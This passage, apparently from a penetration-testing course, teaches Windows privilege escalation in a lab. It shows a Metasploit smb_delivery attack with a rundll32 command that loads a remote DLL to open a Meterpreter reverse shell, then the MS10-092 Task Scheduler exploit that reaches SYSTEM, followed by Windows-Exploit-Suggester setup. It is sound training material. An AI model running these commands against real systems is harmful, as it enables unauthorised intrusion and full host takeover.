   #  <span class="hljs-keyword">Name</span>                              Disclosure Date  Rank       Check  Description
   -  ----                              ---------------  ----       -----  -----------
   <span class="hljs-number">0</span>  exploit/windows/smb/smb_delivery  <span class="hljs-number">2016</span>-<span class="hljs-number">07</span>-<span class="hljs-number">26</span>       excellent  No     SMB Delivery
Interact <span class="hljs-keyword">with</span> a module by <span class="hljs-keyword">name</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">index</span>. <span class="hljs-keyword">For</span> example info <span class="hljs-number">0</span>, use <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> use exploit/windows/smb/smb_delivery


msf6 exploit(windows/smb/smb_delivery) &gt; use <span class="hljs-number">0</span>

[*] Using configured payload windows/meterpreter/reverse_tcp


msf6 exploit(windows/smb/smb_delivery) &gt; show options 

Module options (exploit/windows/smb/smb_delivery):
   <span class="hljs-keyword">Name</span>         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_NAME    test.dll         no        DLL <span class="hljs-keyword">file</span> <span class="hljs-keyword">name</span>
   FOLDER_NAME                   no        Folder <span class="hljs-keyword">name</span> <span class="hljs-keyword">to</span> share (<span class="hljs-keyword">Default</span> none)
   SHARE                         no        Share (<span class="hljs-keyword">Default</span> Random)
   SRVHOST      <span class="hljs-number">10.10</span>.<span class="hljs-number">14.3</span>       yes       The <span class="hljs-keyword">local</span> host <span class="hljs-keyword">or</span> network <span class="hljs-keyword">interface</span> <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>. This must be an address <span class="hljs-keyword">on</span> the <span class="hljs-keyword">local</span> machine <span class="hljs-keyword">or</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span> all addresses.
   SRVPORT      <span class="hljs-number">445</span>              yes       The <span class="hljs-keyword">local</span> port <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>.
Payload options (windows/meterpreter/reverse_tcp):
   <span class="hljs-keyword">Name</span>      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       <span class="hljs-keyword">Exit</span> technique (Accepted: <span class="hljs-string">''</span>, seh, thread, process, none)
   LHOST     <span class="hljs-number">10.10</span>.<span class="hljs-number">14.3</span>       yes       The listen address (an <span class="hljs-keyword">interface</span> may be specified)
   LPORT     <span class="hljs-number">4444</span>             yes       The listen port
Exploit target:
   Id  <span class="hljs-keyword">Name</span>
   --  ----
   <span class="hljs-number">1</span>   PSH


msf6 exploit(windows/smb/smb_delivery) &gt; show targets

Exploit targets:

   Id  <span class="hljs-keyword">Name</span>
   --  ----
   <span class="hljs-number">0</span>   DLL
   <span class="hljs-number">1</span>   PSH


msf6 exploit(windows/smb/smb_delivery) &gt; <span class="hljs-keyword">set</span> target <span class="hljs-number">0</span>

target =&gt; <span class="hljs-number">0</span>


msf6 exploit(windows/smb/smb_delivery) &gt; exploit 
[*] Exploit running <span class="hljs-keyword">as</span> background job <span class="hljs-number">1</span>.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.3</span>:<span class="hljs-number">4444</span> 
[*] Started service listener <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.3</span>:<span class="hljs-number">445</span> 
[*] Server started.
[*] Run the following command <span class="hljs-keyword">on</span> the target machine:
rundll32.exe \\<span class="hljs-number">10.10</span>.<span class="hljs-number">14.3</span>\lEUZam\test.dll,<span class="hljs-number">0</span>
</code></pre>
<p><strong>Rundll Command on Target Host</strong></p>
<p>Open a cmd console on the target host and paste in the <code>rundll32.exe</code> command.</p>
<p>Windows Server</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">rundll32</span><span class="hljs-selector-class">.exe</span> \\10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.3</span>\<span class="hljs-selector-tag">lEUZam</span>\<span class="hljs-selector-tag">test</span><span class="hljs-selector-class">.dll</span>,0
</code></pre>
<p><strong>Receiving Reverse Shell</strong></p>
<p>We get a call back quickly.</p>
<p>Windows Server</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">msf6</span> <span class="hljs-selector-tag">exploit</span>(windows/smb/smb_delivery) &gt; <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Sending</span> <span class="hljs-selector-tag">stage</span> (<span class="hljs-number">175174</span> bytes) <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.15</span>
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Meterpreter</span> <span class="hljs-selector-tag">session</span> <span class="hljs-selector-tag">1</span> <span class="hljs-selector-tag">opened</span> (<span class="hljs-number">10.10</span>.<span class="hljs-number">14.3</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">10.129</span>.<span class="hljs-number">43.15</span>:<span class="hljs-number">49609</span>) <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">2021-05-12</span> <span class="hljs-selector-tag">15</span><span class="hljs-selector-pseudo">:55</span><span class="hljs-selector-pseudo">:05</span> <span class="hljs-selector-tag">-0400</span>
</code></pre>
<p><strong>Searching for Local Privilege Escalation Exploit</strong></p>
<p>From here, let&#39;s search for the <a href="https://www.exploit-db.com/exploits/19930">MS10_092 Windows Task Scheduler &#39;.XML&#39; Privilege Escalation</a> module.</p>
<p>Windows Server</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/smb/smb<span class="hljs-emphasis">_delivery) &gt; search 2010-3338

</span><span class="hljs-section">Matching Modules
================</span>
<span class="hljs-code">   #  Name                                        Disclosure Date  Rank       Check  Description</span>
<span class="hljs-code">   -  ----                                        ---------------  ----       -----  -----------</span>
<span class="hljs-code">   0  exploit/windows/local/ms10_092_schelevator  2010-09-13       excellent  Yes    Windows Escalate Task Scheduler XML Privilege Escalation</span>


msf6 exploit(windows/smb/smb<span class="hljs-emphasis">_delivery) use 0</span>
</code></pre>
<p><strong>Migrating to a 64-bit Process</strong></p>
<p>Before using the module in question, we need to hop into our Meterpreter shell and migrate to a 64-bit process, or the exploit will not work. We could have also chosen an x64 Meterpeter payload during the <code>smb_delivery</code> step.</p>
<p>Windows Server</p>
<pre><code class="lang-shell-session">msf6 post(multi/recon/local_exploit_suggester) &gt; sessions -i <span class="hljs-number">1</span>

[*] Starting interaction with <span class="hljs-number">1</span>...

meterpreter &gt; <span class="hljs-built_in">getpid</span>

Current pid: <span class="hljs-number">2268</span>


meterpreter &gt; <span class="hljs-keyword">ps</span>

Process List
============
 PID   PPID  Name               Arch  Session  User                    Path
 ---   ----  ----               ----  -------  ----                    ----
 <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     [System Process]
 <span class="hljs-number">4</span>     <span class="hljs-number">0</span>     System
 <span class="hljs-number">164</span>   <span class="hljs-number">1800</span>  VMwareUser.<span class="hljs-keyword">exe</span>     x86   <span class="hljs-number">2</span>        WINLPE-<span class="hljs-number">2</span>K8\htb-student  C:\Program Files (x86)\VMware\VMware Tools\VMwareUser.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">244</span>   <span class="hljs-number">2032</span>  winlogon.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">260</span>   <span class="hljs-number">4</span>     smss.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">288</span>   <span class="hljs-number">476</span>   svchost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">332</span>   <span class="hljs-number">324</span>   csrss.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">376</span>   <span class="hljs-number">324</span>   wininit.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">476</span>   <span class="hljs-number">376</span>   services.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">492</span>   <span class="hljs-number">376</span>   lsass.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">500</span>   <span class="hljs-number">376</span>   lsm.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">584</span>   <span class="hljs-number">476</span>   mscorsvw.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">600</span>   <span class="hljs-number">476</span>   svchost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">616</span>   <span class="hljs-number">476</span>   msdtc.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">676</span>   <span class="hljs-number">476</span>   svchost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">744</span>   <span class="hljs-number">476</span>   taskhost.<span class="hljs-keyword">exe</span>       x64   <span class="hljs-number">2</span>        WINLPE-<span class="hljs-number">2</span>K8\htb-student  C:\Windows\System32\taskhost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">756</span>   <span class="hljs-number">1800</span>  VMwareTray.<span class="hljs-keyword">exe</span>     x86   <span class="hljs-number">2</span>        WINLPE-<span class="hljs-number">2</span>K8\htb-student  C:\Program Files (x86)\VMware\VMware Tools\VMwareTray.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">764</span>   <span class="hljs-number">476</span>   svchost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">800</span>   <span class="hljs-number">476</span>   svchost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">844</span>   <span class="hljs-number">476</span>   svchost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">900</span>   <span class="hljs-number">476</span>   svchost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">940</span>   <span class="hljs-number">476</span>   svchost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">976</span>   <span class="hljs-number">476</span>   spoolsv.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">1012</span>  <span class="hljs-number">476</span>   sppsvc.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">1048</span>  <span class="hljs-number">476</span>   svchost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">1112</span>  <span class="hljs-number">476</span>   VMwareService.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">1260</span>  <span class="hljs-number">2460</span>  powershell.<span class="hljs-keyword">exe</span>     x64   <span class="hljs-number">2</span>        WINLPE-<span class="hljs-number">2</span>K8\htb-student  C:\Windows\System32\WindowsPowerShell\v1.<span class="hljs-number">0</span>\powershell.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">1408</span>  <span class="hljs-number">2632</span>  conhost.<span class="hljs-keyword">exe</span>        x64   <span class="hljs-number">2</span>        WINLPE-<span class="hljs-number">2</span>K8\htb-student  C:\Windows\System32\conhost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">1464</span>  <span class="hljs-number">900</span>   dwm.<span class="hljs-keyword">exe</span>            x64   <span class="hljs-number">2</span>        WINLPE-<span class="hljs-number">2</span>K8\htb-student  C:\Windows\System32\dwm.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">1632</span>  <span class="hljs-number">476</span>   svchost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">1672</span>  <span class="hljs-number">600</span>   WmiPrvSE.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">2140</span>  <span class="hljs-number">2460</span>  cmd.<span class="hljs-keyword">exe</span>            x64   <span class="hljs-number">2</span>        WINLPE-<span class="hljs-number">2</span>K8\htb-student  C:\Windows\System32\cmd.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">2256</span>  <span class="hljs-number">600</span>   WmiPrvSE.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">2264</span>  <span class="hljs-number">476</span>   mscorsvw.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">2268</span>  <span class="hljs-number">2628</span>  rundll32.<span class="hljs-keyword">exe</span>       x86   <span class="hljs-number">2</span>        WINLPE-<span class="hljs-number">2</span>K8\htb-student  C:\Windows\SysWOW64\rundll32.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">2460</span>  <span class="hljs-number">2656</span>  explorer.<span class="hljs-keyword">exe</span>       x64   <span class="hljs-number">2</span>        WINLPE-<span class="hljs-number">2</span>K8\htb-student  C:\Windows\explorer.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">2632</span>  <span class="hljs-number">2032</span>  csrss.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">2796</span>  <span class="hljs-number">2632</span>  conhost.<span class="hljs-keyword">exe</span>        x64   <span class="hljs-number">2</span>        WINLPE-<span class="hljs-number">2</span>K8\htb-student  C:\Windows\System32\conhost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">2876</span>  <span class="hljs-number">476</span>   svchost.<span class="hljs-keyword">exe</span>
 <span class="hljs-number">3048</span>  <span class="hljs-number">476</span>   svchost.<span class="hljs-keyword">exe</span>


meterpreter &gt; migrate <span class="hljs-number">2796</span>

[*] Migrating from <span class="hljs-number">2268</span> <span class="hljs-keyword">to</span> <span class="hljs-number">2796</span>...
[*] Migration completed successfully.


meterpreter &gt; background

[*] Backgrounding session <span class="hljs-number">1</span>...
</code></pre>
<p><strong>Setting Privilege Escalation Module Options</strong></p>
<p>Once this is set, we can now set up the privilege escalation module by specifying our current Meterpreter session, setting our tun0 IP for the LHOST, and a call-back port of our choosing.</p>
<p>Windows Server</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/<span class="hljs-built_in">local</span>/ms10_092_schelevator) &gt; <span class="hljs-built_in">set</span> SESSION <span class="hljs-number">1</span>

SESSION =&gt; <span class="hljs-number">1</span>


msf6 exploit(windows/<span class="hljs-built_in">local</span>/ms10_092_schelevator) &gt; <span class="hljs-built_in">set</span> lhost <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>

lhost =&gt; <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>


msf6 exploit(windows/<span class="hljs-built_in">local</span>/ms10_092_schelevator) &gt; <span class="hljs-built_in">set</span> lport <span class="hljs-number">4443</span>

lport =&gt; <span class="hljs-number">4443</span>


msf6 exploit(windows/<span class="hljs-built_in">local</span>/ms10_092_schelevator) &gt; show options

Module options (exploit/windows/<span class="hljs-built_in">local</span>/ms10_092_schelevator):
   Name      Current Setting  Required  Description
   <span class="hljs-comment">----      ---------------  --------  -----------</span>
   CMD                        no        Command <span class="hljs-built_in">to</span> execute instead <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> payload
   SESSION   <span class="hljs-number">1</span>                yes       The session <span class="hljs-built_in">to</span> run this module <span class="hljs-keyword">on</span>.
   TASKNAME                   no        A name <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> created task (default <span class="hljs-built_in">random</span>)
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   <span class="hljs-comment">----      ---------------  --------  -----------</span>
   EXITFUNC  <span class="hljs-built_in">process</span>          yes       Exit technique (Accepted: <span class="hljs-string">''</span>, seh, thread, <span class="hljs-built_in">process</span>, <span class="hljs-literal">none</span>)
   LHOST     <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>       yes       The listen address (<span class="hljs-keyword">an</span> interface may be specified)
   LPORT     <span class="hljs-number">4443</span>             yes       The listen port
Exploit target:
   Id  Name
   <span class="hljs-comment">--  ----</span>
   <span class="hljs-number">0</span>   Windows Vista, <span class="hljs-number">7</span>, <span class="hljs-keyword">and</span> <span class="hljs-number">2008</span>
</code></pre>
<p><strong>Receiving Elevated Reverse Shell</strong></p>
<p>If all goes to plan, once we type <code>exploit</code>, we will receive a new Meterpreter shell as the <code>NT AUTHORITY\SYSTEM</code> account and can move on to perform any necessary post-exploitation.</p>
<p>Windows Server</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/local/ms10_092_schelevator) &gt; exploit

[*] <span class="hljs-symbol">Started</span> reverse <span class="hljs-symbol">TCP</span> handler on <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>:<span class="hljs-number">4443</span>
[*] <span class="hljs-symbol">Preparing</span> payload at <span class="hljs-symbol">C</span>:\<span class="hljs-symbol">Windows</span>\<span class="hljs-symbol">TEMP</span>\uQEcovJYYHhC.exe
[*] <span class="hljs-symbol">Creating</span> task: isqR4gw3RlxnplB
[*] <span class="hljs-symbol">SUCCESS</span>: <span class="hljs-symbol">The</span> scheduled task <span class="hljs-string">"isqR4gw3RlxnplB"</span> has successfully been created.
[*] <span class="hljs-symbol">SCHELEVATOR</span>
[*] <span class="hljs-symbol">Reading</span> the task file contents from <span class="hljs-symbol">C</span>:\<span class="hljs-symbol">Windows</span>\system32\tasks\isqR4gw3RlxnplB...
[*] <span class="hljs-symbol">Original</span> <span class="hljs-symbol">CRC32</span>: <span class="hljs-number">0x89b06d1a</span>
[*] <span class="hljs-symbol">Final</span> <span class="hljs-symbol">CRC32</span>: <span class="hljs-number">0x89b06d1a</span>
[*] <span class="hljs-symbol">Writing</span> our modified content back...
[*] <span class="hljs-symbol">Validating</span> task: isqR4gw3RlxnplB
[*]
[*] <span class="hljs-symbol">Folder</span>: \
[*] <span class="hljs-symbol">TaskName</span>                                 <span class="hljs-symbol">Next</span> <span class="hljs-symbol">Run</span> <span class="hljs-symbol">Time</span>          <span class="hljs-symbol">Status</span>
[*] ======================================== ====================== ===============
[*] isqR4gw3RlxnplB                          <span class="hljs-number">6</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2021</span> <span class="hljs-number">1</span>:<span class="hljs-number">04</span>:<span class="hljs-number">00</span> <span class="hljs-symbol">PM</span>    <span class="hljs-symbol">Ready</span>
[*] <span class="hljs-symbol">SCHELEVATOR</span>
[*] <span class="hljs-symbol">Disabling</span> the task...
[*] <span class="hljs-symbol">SUCCESS</span>: <span class="hljs-symbol">The</span> parameters of scheduled task <span class="hljs-string">"isqR4gw3RlxnplB"</span> have been changed.
[*] <span class="hljs-symbol">SCHELEVATOR</span>
[*] <span class="hljs-symbol">Enabling</span> the task...
[*] <span class="hljs-symbol">SUCCESS</span>: <span class="hljs-symbol">The</span> parameters of scheduled task <span class="hljs-string">"isqR4gw3RlxnplB"</span> have been changed.
[*] <span class="hljs-symbol">SCHELEVATOR</span>
[*] <span class="hljs-symbol">Executing</span> the task...
[*] <span class="hljs-symbol">Sending</span> stage (<span class="hljs-number">175174</span> bytes) to <span class="hljs-number">10.129</span><span class="hljs-number">.43</span><span class="hljs-number">.15</span>
[*] <span class="hljs-symbol">SUCCESS</span>: <span class="hljs-symbol">Attempted</span> to run the scheduled task <span class="hljs-string">"isqR4gw3RlxnplB"</span>.
[*] <span class="hljs-symbol">SCHELEVATOR</span>
[*] <span class="hljs-symbol">Deleting</span> the task...
[*] <span class="hljs-symbol">Meterpreter</span> session <span class="hljs-number">2</span> opened (<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>:<span class="hljs-number">4443</span> -&gt; <span class="hljs-number">10.129</span><span class="hljs-number">.43</span><span class="hljs-number">.15</span>:<span class="hljs-number">49634</span>) at <span class="hljs-number">2021</span><span class="hljs-number">-05</span><span class="hljs-number">-12</span> <span class="hljs-number">16</span>:<span class="hljs-number">04</span>:<span class="hljs-number">34</span> <span class="hljs-number">-0400</span>
[*] <span class="hljs-symbol">SUCCESS</span>: <span class="hljs-symbol">The</span> scheduled task <span class="hljs-string">"isqR4gw3RlxnplB"</span> was successfully deleted.
[*] <span class="hljs-symbol">SCHELEVATOR</span>


meterpreter &gt; getuid

<span class="hljs-symbol">Server</span> username: <span class="hljs-symbol">NT</span> <span class="hljs-symbol">AUTHORITY</span>\<span class="hljs-symbol">SYSTEM</span>


meterpreter &gt; sysinfo

<span class="hljs-symbol">Computer</span>        : <span class="hljs-symbol">WINLPE</span><span class="hljs-number">-2</span><span class="hljs-symbol">K8</span>
<span class="hljs-symbol">OS</span>              : <span class="hljs-symbol">Windows</span> <span class="hljs-number">2008</span> <span class="hljs-symbol">R2</span> (<span class="hljs-number">6.1</span> <span class="hljs-symbol">Build</span> <span class="hljs-number">7600</span>).
<span class="hljs-symbol">Architecture</span>    : x64
<span class="hljs-symbol">System</span> <span class="hljs-symbol">Language</span> : en_US
<span class="hljs-symbol">Domain</span>          : <span class="hljs-symbol">WORKGROUP</span>
<span class="hljs-symbol">Logged</span> <span class="hljs-symbol">On</span> <span class="hljs-symbol">Users</span> : <span class="hljs-number">3</span>
<span class="hljs-symbol">Meterpreter</span>     : x86/windows
</code></pre>
<hr>
<h3 id="attacking-server-2008">Attacking Server 2008</h3>
<p>Taking the enumeration examples we have gone through in this module, access the system below, find one way to escalate to <code>NT AUTHORITY\SYSTEM</code> level access (there may be more than one way), and submit the <code>flag.txt</code> file on the Administrator desktop. Challenge yourself to escalate privileges multiple ways and don&#39;t merely reproduce the Task Scheduler privilege escalation detailed above.</p>
<h2 id="windows-desktop-versions">Windows Desktop Versions</h2>
<hr>
<p>Windows 7 was made end-of-life on January 14, 2020, but is still in use in many environments.</p>
<hr>
<h3 id="windows-7-vs-newer-versions">Windows 7 vs. Newer Versions</h3>
<p>Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Desktop. The table below shows some notable differences between Windows 7 and Windows 10.</p>
<table>
<thead>
<tr>
<th>Feature</th>
<th>Windows 7</th>
<th>Windows 10</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/">Microsoft Password (MFA)</a></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview">BitLocker</a></td>
<td>Partial</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard">Credential Guard</a></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard">Remote Credential Guard</a></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td><a href="https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419">Device Guard (code integrity)</a></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">AppLocker</a></td>
<td>Partial</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://www.microsoft.com/en-us/windows/comprehensive-security">Windows Defender</a></td>
<td>Partial</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a></td>
<td></td>
<td>X</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="windows-7-case-study">Windows 7 Case Study</h3>
<p>To this date, estimates state that there may be over 100 million users still on Windows 7. According to <a href="https://www.netmarketshare.com/operating-system-market-share.aspx">NetMarketShare</a>, as of November 2020, Windows 7 was the second most used desktop operating system after Windows 10. Windows 7 is standard in large companies across the education, retail, transportation, healthcare, financial, government, and manufacturing sectors.</p>
<p>As discussed in the last section, as penetration testers, we must understand our clients&#39; core business, risk appetite, and limitations that may prevent them from entirely moving off all versions of EOL systems such as Windows 7. It is not good enough for us to merely give them a finding for an EOL system with the recommendation of upgrading/decommissioning without any context. We should have ongoing discussions with our clients during our assessments to gain an understanding of their environment. Even if we can attack/escalate privileges on a Windows 7 host, there may be steps that a client can take to limit exposure until they can move off the EOL system(s).</p>
<p>A large retail client may have Windows 7 embedded devices in 100s of their stores running their point of sale (POS) systems. It may not be financially feasible for them to upgrade them all at once, so we may need to work with them to develop solutions to mitigate the risk. A large law firm with one old Windows 7 system may be able to upgrade immediately or even remove it from the network. Context is important.</p>
<p>Let&#39;s look at a Windows 7 host that we may uncover in one of the sectors mentioned above. For our Windows 7 target, we can use <code>Sherlock</code> again like in the Server 2008 example, but let&#39;s take a look at <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a></p>
<p><strong>Install Python Dependencies (local VM only)</strong></p>
<p>This tool works on the Pwnbox, but to get it working on a local version of Parrot, we need to do the following to install the necessary dependencies.</p>
<p>Windows Desktop Versions</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo wget https:/</span><span class="hljs-regexp">/files.pythonhosted.org/</span>packages<span class="hljs-regexp">/28/</span><span class="hljs-number">84</span><span class="hljs-regexp">/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/</span>setuptools<span class="hljs-number">-2.0</span>.tar.gz
root<span class="hljs-meta">@htb</span>[/htb]$ sudo tar -xf setuptools<span class="hljs-number">-2.0</span>.tar.gz
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cd setuptools-2.0/</span>
root<span class="hljs-meta">@htb</span>[/htb]$ sudo python2<span class="hljs-number">.7</span> setup.py install

root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo wget https:/</span><span class="hljs-regexp">/files.pythonhosted.org/</span>packages<span class="hljs-regexp">/42/</span><span class="hljs-number">85</span><span class="hljs-regexp">/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/</span>xlrd<span class="hljs-number">-1.0</span><span class="hljs-number">.0</span>.tar.gz
root<span class="hljs-meta">@htb</span>[/htb]$ sudo tar -xf xlrd<span class="hljs-number">-1.0</span><span class="hljs-number">.0</span>.tar.gz
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cd xlrd-1.0.0/</span>
root<span class="hljs-meta">@htb</span>[/htb]$ sudo python2<span class="hljs-number">.7</span> setup.py install
</code></pre>
<p><strong>Gathering Systeminfo Command Output</strong></p>
<p>Once this is done, we need to capture the <code>systeminfo</code> command&#39;s output and save it to a text file on our attack VM.</p>
<p>Windows Desktop Versions</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; systeminfo

Host <span class="hljs-string">Name:</span>                 WINLPE-WIN7
OS <span class="hljs-string">Name:</span>                   Microsoft Windows <span class="hljs-number">7</span> Professional
OS <span class="hljs-string">Version:</span>                <span class="hljs-number">6.1</span><span class="hljs-number">.7601</span> Service Pack <span class="hljs-number">1</span> Build <span class="hljs-number">7601</span>
OS <span class="hljs-string">Manufacturer:</span>           Microsoft Corporation
OS <span class="hljs-string">Configuration:</span>          Standalone Workstation
OS Build <span class="hljs-string">Type:</span>             Multiprocessor Free
Registered <span class="hljs-string">Owner:</span>          mrb3n
Registered <span class="hljs-string">Organization:</span>
Product <span class="hljs-string">ID:</span>                <span class="hljs-number">00371</span><span class="hljs-number">-222</span><span class="hljs-number">-9819843</span><span class="hljs-number">-86644</span>
Original Install <span class="hljs-string">Date:</span>     <span class="hljs-number">3</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2021</span>, <span class="hljs-number">7</span>:<span class="hljs-number">23</span>:<span class="hljs-number">47</span> PM
System Boot <span class="hljs-string">Time:</span>          <span class="hljs-number">5</span><span class="hljs-regexp">/13/</span><span class="hljs-number">2021</span>, <span class="hljs-number">5</span>:<span class="hljs-number">14</span>:<span class="hljs-number">12</span> PM
System <span class="hljs-string">Manufacturer:</span>       VMware, Inc.
System <span class="hljs-string">Model:</span>              VMware Virtual Platform
System <span class="hljs-string">Type:</span>               x64-based PC
Processor(s):              <span class="hljs-number">2</span> Processor(s) Installed.
                           [<span class="hljs-number">01</span>]: AMD64 Family <span class="hljs-number">23</span> Model <span class="hljs-number">49</span> Stepping <span class="hljs-number">0</span> AuthenticAMD ~<span class="hljs-number">2994</span> Mhz
                           [<span class="hljs-number">02</span>]: AMD64 Family <span class="hljs-number">23</span> Model <span class="hljs-number">49</span> Stepping <span class="hljs-number">0</span> AuthenticAMD ~<span class="hljs-number">2994</span> Mhz
BIOS <span class="hljs-string">Version:</span>              Phoenix Technologies LTD <span class="hljs-number">6.00</span>, <span class="hljs-number">12</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2018</span>
Windows <span class="hljs-string">Directory:</span>         <span class="hljs-string">C:</span>\Windows

&lt;SNIP&gt;
</code></pre>
<p><strong>Updating the Local Microsoft Vulnerability Database</strong></p>
<p>We then need to update our local copy of the Microsoft Vulnerability database. This command will save the contents to a local Excel file.</p>
<p>Windows Desktop Versions</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo python2.<span class="hljs-number">7</span> windows-exploit-suggester.py --update
</code></pre>
<p><strong>Running Windows Exploit Suggester</strong></p>
<p>Once this is done, we can run the tool against the vulnerability database to check for potential privilege escalation flaws.</p>
<p>Windows Desktop Versions</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-comment">[/htb]</span>$ python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 

<span class="hljs-comment">[*]</span> initiating winsploit version 3.3...
<span class="hljs-comment">[*]</span> database file detected as xls or xlsx based on extension
<span class="hljs-comment">[*]</span> attempting to read from the systeminfo input file
<span class="hljs-comment">[+]</span> systeminfo input file read successfully (utf-8)
<span class="hljs-comment">[*]</span> querying database file for potential vulnerabilities
<span class="hljs-comment">[*]</span> comparing the 3 hotfix(es) against the 386 potential bulletins(s) with a database <span class="hljs-keyword">of</span> 137 known exploits
<span class="hljs-comment">[*]</span> there <span class="hljs-keyword">are</span> now 386 remaining vulns
<span class="hljs-comment">[+]</span> <span class="hljs-comment">[E]</span> exploitdb PoC, <span class="hljs-comment">[M]</span> Metasploit module, <span class="hljs-comment">[*]</span> missing bulletin
